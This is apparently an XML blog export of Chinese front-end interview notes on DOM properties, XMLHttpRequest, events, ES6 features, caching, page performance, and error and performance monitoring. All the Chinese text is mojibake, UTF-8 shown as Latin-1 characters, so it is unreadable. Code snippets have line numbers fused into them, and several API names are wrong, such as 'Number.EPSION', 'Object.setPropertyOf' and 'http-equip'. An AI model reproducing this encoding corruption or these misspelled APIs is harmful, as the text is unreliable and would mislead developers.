æ–‡æ¡£ä¸­è®¿é—®ç‰¹å®šå…ƒç´ çš„ç‰¹æ€§ï¼Œæµè§ˆå™¨è§£æžå…ƒç´ åŽç”Ÿæˆå¯¹åº”å¯¹è±¡ï¼ˆå¦‚ a æ ‡ç­¾ç”Ÿæˆ HTMLAnchorElementï¼‰ï¼Œè¿™äº›å¯¹è±¡çš„ç‰¹æ€§ä¼šæ ¹æ®ç‰¹å®šè§„åˆ™ç»“åˆå±žæ€§è®¾ç½®å¾—åˆ°ï¼Œå¯¹äºŽæ²¡æœ‰å¯¹åº”ç‰¹æ€§çš„å±žæ€§ï¼Œåªèƒ½ä½¿ç”¨ getAttribute è¿›è¡Œè®¿é—®ï¼› ä¸€äº› attribute å’Œ property ä¸æ˜¯ä¸€ä¸€å¯¹åº”å¦‚ï¼šform æŽ§ä»¶ä¸­å¯¹åº”çš„æ˜¯ defaultValueï¼Œä¿®æ”¹æˆ–è®¾ç½® value property ä¿®æ”¹çš„æ˜¯æŽ§ä»¶å½“å‰å€¼ï¼ŒsetAttribute ä¿®æ”¹ value å±žæ€§ä¸ä¼šæ”¹å˜ value propertyï¼› offsetWidth/offsetHeight,clientWidth/clientHeight ä¸Ž scrollWidth/scrollHeight çš„åŒºåˆ«ï¼Ÿ offsetWidth/offsetHeight è¿”å›žå€¼åŒ…å« content + padding + borderï¼Œæ•ˆæžœä¸Ž e.getBoundingClientRect()ç›¸åŒ clientWidth/clientHeight è¿”å›žå€¼åªåŒ…å« content + paddingï¼Œå¦‚æžœæœ‰æ»šåŠ¨æ¡ï¼Œä¹Ÿä¸åŒ…å«æ»šåŠ¨æ¡ scrollWidth/scrollHeight è¿”å›žå€¼åŒ…å« content + padding + æº¢å‡ºå†…å®¹çš„å°ºå¯¸ XMLHttpRequest é€šç”¨å±žæ€§å’Œæ–¹æ³• readyState:è¡¨ç¤ºè¯·æ±‚çŠ¶æ€çš„æ•´æ•°ï¼Œå–å€¼ï¼š UNSENTï¼ˆ0ï¼‰ï¼šå¯¹è±¡å·²åˆ›å»º OPENEDï¼ˆ1ï¼‰ï¼šopen()æˆåŠŸè°ƒç”¨ï¼Œåœ¨è¿™ä¸ªçŠ¶æ€ä¸‹ï¼Œå¯ä»¥ä¸º xhr è®¾ç½®è¯·æ±‚å¤´ï¼Œæˆ–è€…ä½¿ç”¨ send()å‘é€è¯·æ±‚ HEADERS_RECEIVED(2)ï¼šæ‰€æœ‰é‡å®šå‘å·²ç»è‡ªåŠ¨å®Œæˆè®¿é—®ï¼Œå¹¶ä¸”æœ€ç»ˆå“åº”çš„ HTTP å¤´å·²ç»æ”¶åˆ° LOADING(3)ï¼šå“åº”ä½“æ­£åœ¨æŽ¥æ”¶ DONE(4)ï¼šæ•°æ®ä¼ è¾“å®Œæˆæˆ–è€…ä¼ è¾“äº§ç”Ÿé”™è¯¯ onreadystatechangeï¼šreadyState æ”¹å˜æ—¶è°ƒç”¨çš„å‡½æ•° statusï¼šæœåŠ¡å™¨è¿”å›žçš„ HTTP çŠ¶æ€ç ï¼ˆå¦‚ï¼Œ200ï¼Œ 404ï¼‰ statusText:æœåŠ¡å™¨è¿”å›žçš„ HTTP çŠ¶æ€ä¿¡æ¯ï¼ˆå¦‚ï¼ŒOKï¼ŒNo Contentï¼‰ responseText:ä½œä¸ºå­—ç¬¦ä¸²å½¢å¼çš„æ¥è‡ªæœåŠ¡å™¨çš„å®Œæ•´å“åº” responseXML: Document å¯¹è±¡ï¼Œè¡¨ç¤ºæœåŠ¡å™¨çš„å“åº”è§£æžæˆçš„ XML æ–‡æ¡£ abort():å–æ¶ˆå¼‚æ­¥ HTTP è¯·æ±‚ getAllResponseHeaders(): è¿”å›žä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒåŒ…å«å“åº”ä¸­æœåŠ¡å™¨å‘é€çš„å…¨éƒ¨ HTTP æŠ¥å¤´ã€‚æ¯ä¸ªæŠ¥å¤´éƒ½æ˜¯ä¸€ä¸ªç”¨å†’å·åˆ†éš”å¼€çš„å/å€¼å¯¹ï¼Œå¹¶ä¸”ä½¿ç”¨ä¸€ä¸ªå›žè½¦/æ¢è¡Œæ¥åˆ†éš”æŠ¥å¤´è¡Œ getResponseHeader(headerName):è¿”å›ž headName å¯¹åº”çš„æŠ¥å¤´å€¼ open(method, url, asynchronous [, user, password]):åˆå§‹åŒ–å‡†å¤‡å‘é€åˆ°æœåŠ¡å™¨ä¸Šçš„è¯·æ±‚ã€‚method æ˜¯ HTTP æ–¹æ³•ï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼›url æ˜¯è¯·æ±‚å‘é€çš„ç›¸å¯¹æˆ–ç»å¯¹ URLï¼›asynchronous è¡¨ç¤ºè¯·æ±‚æ˜¯å¦å¼‚æ­¥ï¼›user å’Œ password æä¾›èº«ä»½éªŒè¯ setRequestHeader(name, value):è®¾ç½® HTTP æŠ¥å¤´ send(body):å¯¹æœåŠ¡å™¨è¯·æ±‚è¿›è¡Œåˆå§‹åŒ–ã€‚å‚æ•° body åŒ…å«è¯·æ±‚çš„ä¸»ä½“éƒ¨åˆ†ï¼Œå¯¹äºŽ POST è¯·æ±‚ä¸ºé”®å€¼å¯¹å­—ç¬¦ä¸²ï¼›å¯¹äºŽ GET è¯·æ±‚ï¼Œä¸º null focus/blur ä¸Ž focusin/focusout çš„åŒºåˆ«å’Œè”ç³» focus/blur ä¸å†’æ³¡ï¼Œfocusin/focusout å†’æ³¡ï¼› focus/blur å…¼å®¹å¥½ï¼Œfocusin/focusout åœ¨é™¤ FireFox å¤–çš„æµè§ˆå™¨ä¸‹éƒ½ä¿æŒè‰¯å¥½å…¼å®¹æ€§ï¼› å¯èŽ·å¾—ç„¦ç‚¹çš„å…ƒç´ ï¼š window é“¾æŽ¥è¢«ç‚¹å‡»æˆ–é”®ç›˜æ“ä½œ è¡¨å•ç©ºé—´è¢«ç‚¹å‡»æˆ–é”®ç›˜æ“ä½œ è®¾ç½® tabindex å±žæ€§çš„å…ƒç´ è¢«ç‚¹å‡»æˆ–é”®ç›˜æ“ä½œ mouseover/mouseout ä¸Ž mouseenter/mouseleave çš„åŒºåˆ«ä¸Žè”ç³»ï¼Ÿ mouseover/mouseout æ˜¯å†’æ³¡äº‹ä»¶ï¼›mouseenter/mouseleave ä¸å†’æ³¡ã€‚éœ€è¦ä¸ºå¤šä¸ªå…ƒç´ ç›‘å¬é¼ æ ‡ç§»å…¥/å‡ºäº‹ä»¶æ—¶ï¼ŒæŽ¨è mouseover/mouseout æ‰˜ç®¡ï¼Œæé«˜æ€§èƒ½ å‡½æ•°å†…éƒ¨ arguments å˜é‡æœ‰å“ªäº›ç‰¹æ€§,æœ‰å“ªäº›å±žæ€§,å¦‚ä½•å°†å®ƒè½¬æ¢ä¸ºæ•°ç»„ arguments æ‰€æœ‰å‡½æ•°ä¸­éƒ½åŒ…å«çš„ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œæ˜¯ä¸€ä¸ªç±»æ•°ç»„å¯¹è±¡ï¼Œå¯¹åº”å‡½æ•°è°ƒç”¨æ—¶çš„å®žå‚ã€‚å¦‚æžœå‡½æ•°å®šä¹‰åŒåå‚æ•°ä¼šåœ¨è°ƒç”¨æ—¶è¦†ç›–é»˜è®¤å¯¹è±¡ arguments[index]åˆ†åˆ«å¯¹åº”å‡½æ•°è°ƒç”¨æ—¶çš„å®žå‚ï¼Œå¹¶ä¸”é€šè¿‡ arguments ä¿®æ”¹å®žå‚æ—¶ä¼šåŒæ—¶ä¿®æ”¹å®žå‚ arguments.length ä¸ºå®žå‚çš„ä¸ªæ•°ï¼ˆFunction.length è¡¨ç¤ºå½¢å‚é•¿åº¦ï¼‰ arguments.callee ä¸ºå½“å‰æ­£åœ¨æ‰§è¡Œçš„å‡½æ•°æœ¬èº«ï¼Œä½¿ç”¨è¿™ä¸ªå±žæ€§è¿›è¡Œé€’å½’è°ƒç”¨æ—¶éœ€æ³¨æ„ this çš„å˜åŒ– arguments.caller ä¸ºè°ƒç”¨å½“å‰å‡½æ•°çš„å‡½æ•°ï¼ˆå·²è¢«é—å¼ƒï¼‰ è½¬æ¢ä¸ºæ•°ç»„ï¼švar args = Array.prototype.slice.call(arguments, 0); è§£é‡ŠåŽŸåž‹ç»§æ‰¿çš„å·¥ä½œåŽŸç†æ‰€æœ‰çš„ js å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª prototype å±žæ€§ï¼ŒæŒ‡å‘å®ƒçš„åŽŸåž‹å¯¹è±¡ã€‚å½“è¯•å›¾è®¿é—®ä¸€ä¸ªå¯¹è±¡ï¼Œå¦‚æžœåœ¨è¯¥å¯¹è±¡ä¸Šæ²¡æœ‰æ‰¾åˆ°ï¼Œå®ƒè¿˜ä¼šæœå¯»è¯¥å¯¹è±¡çš„åŽŸåž‹ï¼Œä»¥åŠè¯¥å¯¹è±¡çš„åŽŸåž‹çš„åŽŸåž‹ï¼Œä¾æ¬¡å‘ä¸Šæœç´¢ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªåç§°åŒ¹é…çš„å±žæ€§æˆ–åˆ°è¾¾åŽŸåž‹é“¾çš„æœ«å°¾ã€‚ ä½ è§‰å¾— jQuery æºç æœ‰å“ªäº›å†™çš„å¥½çš„åœ°æ–¹ï¼Ÿ jquery æºç å°è£…åœ¨ä¸€ä¸ªåŒ¿åå‡½æ•°çš„è‡ªæ‰§è¡ŒçŽ¯å¢ƒä¸­ï¼Œæœ‰åŠ©äºŽé˜²æ­¢å˜é‡çš„å…¨å±€æ±¡æŸ“ï¼Œç„¶åŽé€šè¿‡ä¼ å…¥ window å¯¹è±¡å‚æ•°ï¼Œå¯ä»¥ä½¿ window å¯¹è±¡ä½œä¸ºå±€éƒ¨å˜é‡ä½¿ç”¨ï¼Œå¥½å¤„æ˜¯å½“ jquery ä¸­è®¿é—® window å¯¹è±¡çš„æ—¶å€™ï¼Œå°±ä¸ç”¨å°†ä½œç”¨åŸŸé“¾é€€å›žåˆ°é¡¶å±‚ä½œç”¨åŸŸäº†ï¼Œä»Žè€Œå¯ä»¥æ›´å¿«çš„è®¿é—® window å¯¹è±¡ã€‚åŒæ ·ï¼Œä¼ å…¥ undefined å‚æ•°ï¼Œå¯ä»¥ç¼©çŸ­æŸ¥æ‰¾ undefined æ—¶çš„ä½œç”¨åŸŸé“¾ jquery å°†ä¸€äº›åŽŸåž‹å±žæ€§å’Œæ–¹æ³•å°è£…åœ¨äº† jquery.prototype ä¸­ï¼Œä¸ºäº†ç¼©çŸ­åç§°ï¼Œåˆèµ‹å€¼ç»™äº† jquery.fnï¼Œè¿™æ˜¯å¾ˆå½¢è±¡çš„å†™æ³• æœ‰ä¸€äº›æ•°ç»„æˆ–å¯¹è±¡çš„æ–¹æ³•ç»å¸¸èƒ½ä½¿ç”¨åˆ°ï¼ŒjQuery å°†å…¶ä¿å­˜ä¸ºå±€éƒ¨å˜é‡ä»¥æé«˜è®¿é—®é€Ÿåº¦ jquery å®žçŽ°çš„é“¾å¼è°ƒç”¨å¯ä»¥èŠ‚çº¦ä»£ç ï¼Œæ‰€è¿”å›žçš„éƒ½æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œå¯ä»¥æé«˜ä»£ç æ•ˆçŽ‡ ES6 ç›¸å¯¹ ES5 æœ‰å“ªäº›æ–°ç‰¹æ€§ï¼Ÿ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990æ–°å¢žletã€constå‘½ä»¤å£°æ˜Žå˜é‡å˜é‡çš„è§£æž„èµ‹å€¼ |--æ•°ç»„çš„è§£æž„ |--å¯¹è±¡çš„è§£æž„ |--å­—ç¬¦ä¸²çš„è§£æž„ |--æ•°å€¼ã€å¸ƒå°”å€¼çš„è§£æž„ |--å‡½æ•°å‚æ•°çš„è§£æž„æ­£åˆ™è¡¨è¾¾å¼çš„æ‰©å±• |--å…è®¸ new RegExp(/abc/, &apos;i&apos;) |--match()ã€replace()ã€search()å’Œsplit()æ·»åŠ åˆ°RegExpå®žä¾‹æ–¹æ³• |--uä¿®é¥°ç¬¦ï¼Œæ­£ç¡®åŒ¹é…å››å­—èŠ‚ï¼ŒUTF-16ç¼–ç  |--yä¿®é¥°ç¬¦ï¼Œä»Žç¬¬ä¸€ä¸ªä½ç½®å¼€å§‹åŒ¹é… |--stickyå±žæ€§ï¼Œè¡¨ç¤ºæ˜¯å¦è®¾ç½®äº†yä¿®é¥°ç¬¦ |--flagså±žæ€§ï¼Œè¿”å›žæ­£åˆ™ä¿®é¥°ç¬¦ |--sä¿®é¥°ç¬¦ï¼Œæ˜¯.å¯ä»¥åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ |--dotAllå±žæ€§ï¼Œè¡¨ç¤ºæ˜¯å¦è®¾ç½®äº†sä¿®é¥°ç¬¦ |--åŽè¡Œæ–­è¨€ï¼Œ/(?&lt;=y)x/ï¼Œxåœ¨yçš„åŽé¢æ‰åŒ¹é…æ•°å€¼çš„æ‰©å±• |--äºŒè¿›åˆ¶ï¼ˆ0bæˆ–0Bï¼‰å’Œå…«è¿›åˆ¶ï¼ˆ0oæˆ–0Oï¼‰ |--Number.isFinite()ï¼ŒNumber.isNaN |--Number.parseInt()ï¼ŒNumber.parseFloat() |--Number.isInteger() |--Number.EPSION |--Number.isSafeInteger() |--æŒ‡æ•°è¿ç®—ç¬¦ï¼ˆ**ï¼‰å‡½æ•°çš„æ‰©å±• |--å‡½æ•°é»˜è®¤å€¼ |--restå‚æ•° |--ä¸¥æ ¼æ¨¡å¼ï¼Œä¸å…è®¸ä½¿ç”¨é»˜è®¤å€¼ã€è§£æž„èµ‹å€¼ã€æˆ–è€…æ‰©å±•è¿ç®—ç¬¦ |--nameå±žæ€§ï¼Œæž„é€ å‡½æ•°nameä¸ºanonymousï¼Œå‡½æ•°bindä½œç”¨åŸŸåŽï¼Œnameä¸ºbound name |--ç®­å¤´å‡½æ•° |--åŒå†’å·è¿ç®—ç¬¦ï¼Œç®­å¤´å‡½æ•°å¯ä»¥ç»‘å®šthiså¯¹è±¡ |--å°¾è°ƒç”¨ä¼˜åŒ– |--å‡½æ•°å‚æ•°çš„å°¾é€—å·æ•°ç»„çš„æ‰©å±• |--[...likeArr]æ‰©å±•è¿ç®—ç¬¦ |--Array.from() |--Array.of() |--æ•°ç»„å®žä¾‹çš„copyWithin() |--æ•°ç»„å®žä¾‹çš„find()å’ŒfindIndex() |--æ•°ç»„å®žä¾‹çš„fill() |--æ•°ç»„å®žä¾‹çš„entries()ï¼Œkeys()å’Œvalues() |--æ•°ç»„å®žä¾‹çš„includes() |--æ•°ç»„çš„ç©ºä½å¯¹è±¡çš„æ‰©å±• |--å±žæ€§çš„ç®€æ´è¡¨ç¤ºæ³• &#123;foo&#125;è¡¨ç¤º&#123;foo:foo&#125; |--å±žæ€§åè¡¨è¾¾å¼ &#123;[propKey]: true&#125; |--Object.is()è§£å†³ NaN!==NaN å’Œ +0===-0 é—®é¢˜ |--Object.assign() |--å±žæ€§çš„éåŽ† |--Object.setPropertyOf()ã€Object.getPropertyOf() |--superå…³é”®å­—ï¼ŒæŒ‡å‘å¯¹è±¡çš„åŽŸåž‹ |--Object.keys()ã€Object.values()ã€Object.entries() |--è§£æž„èµ‹å€¼ |--æ‰©å±•è¿ç®—ç¬¦æ–°å¢žä¸€ç§æ•°æ®ç±»åž‹ Symbol |--éåŽ†Object.getOwnPropertySymbols() |--Symbol.for()ã€Symbol.keyFor()Setå’ŒMapæ•°æ®è§£æž„ProxyReflectPromiseå¯¹è±¡ |--Promise.prototype.then() |--Promise.prototype.catch() |--Promise.prototype.finally() |--Promise.all() |--Promise.race() |--Promise.resolve() |--Promise.reject()Iteratorå’Œfor...ofå¾ªçŽ¯GeneratorasyncClassDecorator let å’Œ const çš„ç‰¹ç‚¹ ä¸ä¼šè¢«æå‡ é‡å¤ä»€ä¹ˆæŠ¥é”™ ä¸ç»‘å®šå…¨å±€ä½œç”¨åŸŸ æå‡é¡µé¢æ€§èƒ½çš„æ–¹æ³•æœ‰å“ªäº›ï¼Ÿ èµ„æºåŽ‹ç¼©åˆå¹¶ï¼Œå‡å°‘ HTTP è¯·æ±‚ éžæ ¸å¿ƒä»£ç å¼‚æ­¥åŠ è½½ è¿½é—®ï¼šå¼‚æ­¥åŠ è½½çš„æ–¹å¼ï¼Ÿï¼ˆ1ï¼‰åŠ¨æ€è„šæœ¬åŠ è½½ï¼ˆ2ï¼‰deferï¼ˆ3ï¼‰asyncè¿½é—®ï¼šå¼‚æ­¥åŠ è½½çš„åŒºåˆ«ï¼Ÿï¼ˆ1ï¼‰deferæ˜¯åœ¨ HTML è§£æžå®ŒåŽæ‰æ‰§è¡Œï¼Œå¦‚æžœæ˜¯å¤šä¸ªï¼ŒæŒ‰ç…§æ‰§è¡ŒåŠ è½½é¡ºåºä¾æ¬¡æ‰§è¡Œï¼ˆ2ï¼‰asyncæ˜¯åœ¨åŠ è½½å®Œä¹‹åŽç«‹å³æ‰§è¡Œï¼Œå¦‚æžœæ˜¯å¤šä¸ªï¼Œæ‰§è¡Œé¡ºåºå’ŒåŠ è½½é¡ºåºæ— å…³ã€‚ åˆ©ç”¨æµè§ˆå™¨ç¼“å­˜ è¿½é—®ï¼šç¼“å­˜çš„åˆ†ç±»ï¼Œç¼“å­˜çš„åŽŸç†ï¼Ÿ å¼ºç¼“å­˜ï¼šä¸è¯¢é—®æœåŠ¡å™¨ç›´æŽ¥ç”¨ æœåŠ¡å™¨å“åº”å¤´Expires Expires: Thu,21 Janâ€¦ è¿™æ˜¯ä¸ªç»å¯¹æ—¶é—´ï¼Œç”±äºŽæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯æœ‰æ—¶å·®ï¼ŒåŽæ¥åœ¨ HTTP/1.1 ä¸­å°±æ”¹æˆäº† Cache-Controlã€‚Cache-Control Cache-Control:max-age=3600 è¿™ä¸ªæ˜¯æ—¶é•¿ï¼Œä»Žå½“å‰æ—¶é—´èµ·ç¼“å­˜æ—¶é•¿ã€‚ åå•†ç¼“å­˜ï¼šè¯¢é—®æœåŠ¡å™¨å½“å‰ç¼“å­˜æ˜¯å¦è¿‡æœŸæœåŠ¡å™¨ä¸‹å‘ Last-Modified æµè§ˆå™¨è¯·æ±‚ If-Modifield-Since Thu,21 Janâ€¦ ä¿®æ”¹æ—¶é—´æœåŠ¡å™¨ä¸‹å‘ Etag æµè§ˆå™¨è¯·æ±‚ If-None-Match èµ„æºæ˜¯å¦è¢«æ”¹åŠ¨è¿‡ ä½¿ç”¨ CDN é¢„è§£æž DNS &lt;a&gt;æ ‡ç­¾æµè§ˆå™¨é»˜è®¤æ¨¡å¼æ˜¯é¢„è§£æžçš„ï¼Œä½†æ˜¯å¯¹äºŽ https æ˜¯å…³é—­çš„ï¼Œéœ€è¦åœ¨headerä¸­æ·»åŠ  12&lt;meta http-equip="x-dns-prefetch-control" content="on"&gt;&lt;link rel="dns-prefetch" href="//host_name_to_prefetch.com"&gt; å¯å‚è€ƒ å‰ç«¯æ€§èƒ½ä¼˜åŒ– 24 æ¡å»ºè®®ï¼ˆ2020ï¼‰ é”™è¯¯ç›‘æŽ§ å‰ç«¯é”™è¯¯åˆ†ç±»ï¼šï¼ˆ1ï¼‰åŠæ—¶è¿è¡Œé”™è¯¯ï¼ˆ2ï¼‰èµ„æºåŠ è½½é”™è¯¯ åŠæ—¶è¿è¡Œé”™è¯¯çš„æ•èŽ·æ–¹å¼ï¼šï¼ˆ1ï¼‰try..catch æ•èŽ·ä»£ç å—è¿è¡Œé”™è¯¯ï¼›ï¼ˆ2ï¼‰window.onerror æ•èŽ· js è¿è¡Œé”™è¯¯ï¼Œä½†æ˜¯æ— æ³•æ•èŽ·é™æ€èµ„æºå¼‚å¸¸å’Œ js ä»£ç é”™è¯¯ï¼›ï¼ˆ3ï¼‰unhandledrejection æ•èŽ· Promise é”™è¯¯ï¼›ï¼ˆ4ï¼‰React çš„æ•èŽ·é”™è¯¯ componentDidCatchï¼›ï¼ˆ5ï¼‰Vue çš„æ•èŽ·é”™è¯¯ Vue.config.errorHandlerï¼› èµ„æºåŠ è½½é”™è¯¯ï¼š ï¼ˆ1ï¼‰object.onerror ï¼ˆ2ï¼‰performance.getEntries()èŽ·å–æˆåŠŸåŠ è½½èµ„æºçš„ apiï¼Œå¯¹æ¯”ä¸€ä¸‹çŽ°æœ‰èµ„æºï¼Œå°±å¯ä»¥çŸ¥é“å¤±è´¥åŠ è½½çš„èµ„æºã€‚ ï¼ˆ3ï¼‰Error äº‹ä»¶æ•èŽ· ps:èµ„æºåŠ è½½é”™è¯¯ä¸ä¼šå†’æ³¡åˆ°`body`ä¸Šï¼Œä½†æ˜¯æ•èŽ·äº‹ä»¶å¯ä»¥ 123window.addEventListener('error', function(e) &#123; console.log(e);&#125;, true) æ‹“å±•ï¼šè·¨åŸŸé”™è¯¯å¯ä»¥æ•èŽ·åˆ°å—ï¼Ÿæ€Žä¹ˆå¤„ç†é”™è¯¯ï¼Ÿ å±žäºŽèµ„æºåŠ è½½é”™è¯¯ï¼Œå¯ä»¥è¢«æ•èŽ·åˆ°ã€‚å¤„ç†ï¼šåœ¨å®¢æˆ·ç«¯ï¼Œscript æ ‡ç­¾å¢žåŠ crossoriginå±žæ€§ï¼ŒæœåŠ¡ç«¯å¢žåŠ  HTTP å“åº”å¤´å¢žåŠ Access-Control-Allow-Origin:*/ ä¸ŠæŠ¥é”™è¯¯çš„åŸºæœ¬åŽŸç†ï¼ˆ1ï¼‰ä¼˜å…ˆä½¿ç”¨Navigator.sendBeaconï¼Œå®ƒé€šè¿‡ HTTP POST å°†æ•°æ®ä¸€æ­¥ä¼ è¾“åˆ°æœåŠ¡å™¨ä¸”ä¸ä¼šå½±å“é¡µé¢å¸è½½ï¼ˆ2ï¼‰ç”¨Ajaxé€šä¿¡ä¸ŠæŠ¥ï¼ˆ3ï¼‰ç”¨Imageå¯¹è±¡ä¸ŠæŠ¥ 1new Image().src = 'http://xxx.com/posterror?error=xxx' æ£€æµ‹å¡é¡¿å’Œå¥”æºƒï¼ˆ1ï¼‰å¡é¡¿æ˜¯æ˜¾ç¤ºå™¨åˆ·æ–°ä¸‹ä¸€å¸§ç”»é¢è¿˜æ²¡å‡†å¤‡å¥½ï¼Œå¯¼è‡´è¿žç»­å¤šæ¬¡å±•ç¤ºç›¸åŒç”»é¢ï¼Œä»Žè€Œè®©ç”¨æˆ·æ„ŸçŸ¥ä¸æµç•…ï¼ˆä¸¢å¸§ï¼‰ï¼Œå¯ä»¥ç”¨ requestAnimationFrame æ–¹æ³•æ¨¡æ‹Ÿå®žçŽ°ï¼Œåœ¨æµè§ˆå™¨ä¸‹ä¸€æ¬¡æ‰§è¡Œé‡ç»˜ä¹‹å‰æ‰§è¡Œ rAF å›žè°ƒï¼Œå¯ä»¥é€šè¿‡æ¯ç§’å†… rAF æ‰§è¡Œæ¬¡æ•°æ¥è®¡ç®— FPSã€‚ï¼ˆ2ï¼‰å¥”æºƒæ—¶ä¸»çº¿ç¨‹è¢«é˜»å¡žï¼Œå¯¹äºŽå¥”æºƒçš„ç›‘æŽ§åªèƒ½åœ¨ç‹¬ç«‹äºŽ JS ä¸»çº¿ç¨‹çš„ Worker çº¿ç¨‹ä¸­è¿›è¡Œï¼ŒWeb Worker å¿ƒè·³æ£€æµ‹çš„æ–¹å¼å¯¹ä¸»çº¿ç¨‹è¿›è¡ŒæŽ¢æµ‹ã€‚ æ€§èƒ½ç›‘æŽ§ FPï¼ˆFirst Paintï¼‰ï¼šå½“å‰é¡µé¢é¦–æ¬¡æ¸²æŸ“çš„æ—¶é—´ç‚¹ï¼Œé€šå¸¸å¼€å§‹è®¿é—® Web é¡µé¢çš„æ—¶é—´ç‚¹åˆ° FP çš„æ—¶é—´ç‚¹çš„è¿™æ®µæ—¶é—´è§†ä¸ºç™½å±æ—¶é—´ï¼Œç®€å•æ¥è¯´å°±æ˜¯æœ‰å±å¹•ä¸­åƒç´ ç‚¹å¼€å§‹æ¸²æŸ“çš„æ—¶åˆ»ä¸º FPã€‚ FCPï¼ˆFirst Contentful Paintï¼‰ï¼šå½“å‰é¡µé¢é¦–æ¬¡æœ‰å†…å®¹æ¸²æŸ“çš„æ—¶é—´ç‚¹ï¼Œè¿™é‡Œçš„å†…å®¹é€šå¸¸æŒ‡çš„æ˜¯æ–‡æœ¬ã€å›¾ç‰‡ã€svg æˆ– canvas å…ƒç´ ã€‚ 12345678910function getPaintTimings() &#123; const &#123; performance &#125; = window if (performance) &#123; const paintEntries = performance.getEntriesByType('paint') return &#123; FP: paintEntries.find((entry) =&gt; entry.name === 'first-paint').startTime, FCP: paintEntries.find((entry) =&gt; entry.name === 'first-contentful-paint').startTime &#125; &#125;&#125; FMPï¼ˆFirst Meaningful Paintï¼‰ï¼šé¦–æ¬¡ç»˜åˆ¶æœ‰æ„ä¹‰å†…å®¹ï¼Œåœ¨è¿™ä¸ªæ—¶åˆ»ï¼Œé¡µé¢æ•´ä½“å¸ƒå±€å’Œæ–‡å­—å†…å®¹å…¨éƒ¨æ¸²æŸ“å®Œæˆï¼Œç”¨æˆ·èƒ½çœ‹åˆ°ä¸»è¦å†…å®¹ï¼Œäº§å“é€šå¸¸ä¹Ÿå…³æ³¨è¯¥æŒ‡æ ‡ã€‚é€šè¿‡ MutationObserve ç›‘å¬ document æ•´ä½“çš„ DOM å˜åŒ–ï¼Œåœ¨å›žè°ƒè®¡ç®—ä¹‹å‰ DOM æ ‘çš„åˆ†æ•°ï¼Œåˆ†æ•°å˜åŒ–æœ€å‰§çƒˆçš„æ—¶åˆ»å³ä¸º FMP çš„æ—¶é—´ç‚¹ã€‚ LCPï¼ˆLargest Contentful Paintï¼‰ï¼šç”¨äºŽåº¦é‡è§†å£ä¸­æœ€å¤§çš„å†…å®¹å…ƒç´ ä½•æ—¶å¯è§ï¼Œå¯ä»¥ç”¨æ¥ç¡®å®šé¡µé¢çš„ä¸»è¦å†…å®¹ä½•æ—¶åœ¨å±å¹•ä¸Šå®Œæˆæ¸²æŸ“ã€‚ 123456const observer = new PerformanceObserver((entryList) =&gt; &#123; for (const entry of entryList.getEntries()) &#123; console.log('LCP Candidate: ', entry.startTime, entry) &#125;&#125;)observer.observe(&#123; type: 'largest-contentful-paint', buffered: true &#125;) TTIï¼ˆTime To Interactiveï¼‰ï¼šä»Žé¡µé¢åŠ è½½å¼€å§‹åˆ°é¡µé¢å¤„äºŽå®Œå…¨å¯äº¤äº’çŠ¶æ€æ‰€èŠ±è´¹çš„æ—¶é—´ã€‚ FIDï¼ˆFirst Input Delayï¼‰ï¼šç”¨æˆ·ç¬¬ä¸€æ¬¡ä¸Žé¡µé¢äº¤äº’çš„å»¶è¿Ÿæ—¶é—´ã€‚ Lighthouse å‡ é¡¹é‡è¦æŒ‡æ ‡ï¼šPerformanceï¼ˆæ€§èƒ½ï¼‰ã€Accessibilityï¼ˆå¯è®¿é—®æ€§ï¼‰ã€Best practicesï¼ˆæœ€ä½³å®žè·µï¼‰ã€SEO å’Œ PWAã€‚å…¶ä¸­ Performance æŒ‡æ ‡çŸ©é˜µç”±ä»¥ä¸‹ç»„æˆï¼šFCPã€TTIã€LCPã€Speed index å‚è€ƒï¼šæ·±å…¥æµ…å‡ºå‰ç«¯ç›‘æŽ§ å“ˆå¸Œç¢°æ’žä¸¤ä¸ªä¸åŒçš„ key ç»è¿‡ hash è®¡ç®—åŽï¼Œå¾—åˆ°ç›¸åŒçš„ hash å€¼ã€‚è§£å†³æ–¹æ³•ï¼šå¼€æ”¾å¯»å€æ³•ã€å† hash æ³•å’Œæ‹‰é“¾æ³•ã€‚å¼€æ”¾å¯»å€æ³•ï¼šåœ°å€å†²çªï¼ŒæŽ¢æµ‹å…¶ä»–å­˜å‚¨å•å…ƒï¼›å† hash æ³•ï¼šä½¿ç”¨ç¬¬äºŒã€ä¸‰ hash æ³•ï¼›æ‹‰é“¾æ³•ï¼šæ¯ä¸€æ ¼éƒ½æ˜¯é“¾è¡¨ï¼Œå†²çªå¾€åŽæ’ï¼›]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯é¢è¯•]]></title>
    <url>%2F2018%2F03%2F03%2Finterview%2F</url>
    <content type="text"><![CDATA[task1ï¼šä¸Šä¸‹é«˜åº¦å›ºå®šï¼Œä¸­é—´è‡ªé€‚åº” css ç›’æ¨¡åž‹æ ‡å‡†æ¨¡åž‹ã€IE æ¨¡åž‹ box-sizing:content-box/border-boxjs å¦‚ä½•èŽ·å–ç›’æ¨¡åž‹çš„å®½ï¼ˆæˆ–é«˜ï¼‰dom.style.widthdom.currentStyle.width â€“IEwindow.getComputedStyle(dom).widthdom.getBoundingClientRect().width ä¸Šä¸‹è¾¹ç•Œé‡å ï¼Œå–æœ€å¤§å€¼çˆ¶å­å…ƒç´ å…„å¼Ÿå…ƒç´ ç©ºå…ƒç´ ï¼ˆmargin-top margin-bottomï¼‰ DOM äº‹ä»¶DOM äº‹ä»¶æ•èŽ·æµç¨‹è‡ªå®šä¹‰äº‹ä»¶ // å½“ä¸€ä¸ªå…ƒç´ æ³¨å†Œå‡ ä¸ªäº‹ä»¶æ—¶ï¼Œåªæ‰§è¡Œç¬¬ä¸€ä¸ªevent.stopImmediatePropagation() æ•°æ®ç±»åž‹è½¬åŒ–è§„åˆ™å·²å…·ä½“å»¶ä¼¸ æ–‡ç« å‚è€ƒä¸€ æ–‡ç« å‚è€ƒäºŒ å‰ç«¯å·¥ç¨‹åˆ†æž FE-interview 